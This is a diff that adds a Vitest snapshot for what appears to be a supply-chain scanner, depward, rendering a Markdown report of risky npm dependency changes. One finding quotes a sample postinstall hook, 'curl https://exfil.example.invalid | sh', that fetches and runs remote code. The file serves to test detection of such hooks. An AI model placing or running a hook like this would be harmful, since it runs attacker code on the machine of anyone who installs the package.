@@ -1,0 +1,71 @@
+// Vitest Snapshot v1, https://vitest.dev/guide/snapshot.html
+
+exports[`renderDiffMarkdown > report shape 1`] = `
+"## depward: 6 dependency changes, 3 need review
+
+Compared with <code>0123456789ab</code> (merge-base) → the working tree.
+
+| Risk | Package | Change | Why |
+|---|---|---|---|
+| 🔴 critical | <code>foo</code> | 1.0.0 → 1.0.1 | new install script · new network · publisher changed |
+| 🟡 medium | <code>fresh</code> | added 0.1.0 | low-downloads |
+| 🔵 low | <code>bar</code> | 1.0.0 → 1.0.1 | new dependency |
+| ⚪ info | <code>down</code> | 1.0.0 → 1.0.1 | lookup failed |
+
+<details open><summary>🔴 <b>critical</b> · <code>foo 1.0.0 → 1.0.1</code> (updated)</summary>
+
+In <code>package-lock.json</code> (line 7).
+
+- **high** <a href="https://github.com/lavitsamson/depward/blob/main/docs/findings.md#diff-new-install-script"><code>diff-new-install-script</code></a>: diff-new-install-script message
+  - <code>package.json</code> <code>postinstall\\: curl https\\://exfil.example.invalid \\| sh</code> new script
+- **high** <a href="https://github.com/lavitsamson/depward/blob/main/docs/findings.md#diff-new-network-in-non-network-pkg"><code>diff-new-network-in-non-network-pkg</code></a>: diff-new-network-in-non-network-pkg message
+  - <code>index.js\\:1</code> <code>fetch(u)</code>
+  - <code>index.js\\:2</code> <code>fetch(u)</code>
+  - <code>index.js\\:3</code> <code>fetch(u)</code>
+  - <code>index.js\\:4</code> <code>fetch(u)</code>
+  - <code>index.js\\:5</code> <code>fetch(u)</code>
+  - _and 3 more_
+- **medium** <a href="https://github.com/lavitsamson/depward/blob/main/docs/findings.md#diff-publisher-changed"><code>diff-publisher-changed</code></a>: diff-publisher-changed message
+
+</details>
+
+<details><summary>🟡 <b>medium</b> · <code>fresh@&#8203;0.1.0</code> (added)</summary>
+
+In <code>package-lock.json</code>.
+
+- **medium** <a href="https://github.com/lavitsamson/depward/blob/main/docs/findings.md#low-downloads"><code>low-downloads</code></a>: low-downloads message
+
+</details>
+
+<details><summary>🔵 <b>low</b> · <code>bar 1.0.0 → 1.0.1</code> (updated)</summary>
+
+In <code>package-lock.json</code>.
+
+- **low** <a href="https://github.com/lavitsamson/depward/blob/main/docs/findings.md#diff-new-dependency"><code>diff-new-dependency</code></a>: diff-new-dependency message
+
+</details>
+
+<details><summary>⚪ <b>info</b> · <code>down 1.0.0 → 1.0.1</code> (updated)</summary>
+
+In <code>package-lock.json</code>.
+
+- **lookup failed** <code>NETWORK</code>: registry timed out
+
+</details>
+
+_1 finding is allowed by the project config and not counted._
+
+<details><summary>2 package changes with no findings</summary>
+
+- <code>baz</code> 1.0.0 → 1.0.1
+- <code>qux</code> 1.0.0 → 1.0.1 · 1 allowed finding
+
+</details>
+
+<details><summary>1 entry skipped (local or bundled)</summary>
+
+- <code>local@&#8203;0.0.0</code>
+
+</details>
+"
+`;
